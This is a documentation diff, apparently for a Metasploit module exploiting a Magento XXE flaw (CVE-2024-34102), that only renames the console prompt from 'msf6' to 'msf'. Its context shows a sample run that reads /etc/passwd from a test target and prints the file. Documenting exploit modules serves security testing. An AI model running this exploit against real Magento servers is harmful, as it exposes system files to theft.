@@ -126,7 +126,7 @@ Module options (exploit/multi/http/magento_xxe_cve_2024_34102):
 ```
 
 ```   
-msf6 exploit(multi/http/magento_xxe_cve_2024_34102) > 
+msf exploit(multi/http/magento_xxe_cve_2024_34102) > 
 [!] AutoCheck is disabled, proceeding with exploitation
 [*] Using URL: http://192.168.128.1:8080/
 [*] Sending XXE request
@@ -134,7 +134,7 @@ msf6 exploit(multi/http/magento_xxe_cve_2024_34102) >
 [+] Received file /etc/passwd content
 [+] File saved in: /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt
 
-msf6 exploit(multi/http/magento_xxe_cve_2024_34102) > cat /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt
+msf exploit(multi/http/magento_xxe_cve_2024_34102) > cat /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt
 [*] exec: cat /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt
 
 root:x:0:0:root:/root:/bin/bash
@@ -155,5 +155,5 @@ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
 _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-msf6 exploit(multi/http/magento_xxe_cve_2024_34102) > 
+msf exploit(multi/http/magento_xxe_cve_2024_34102) > 
 ```
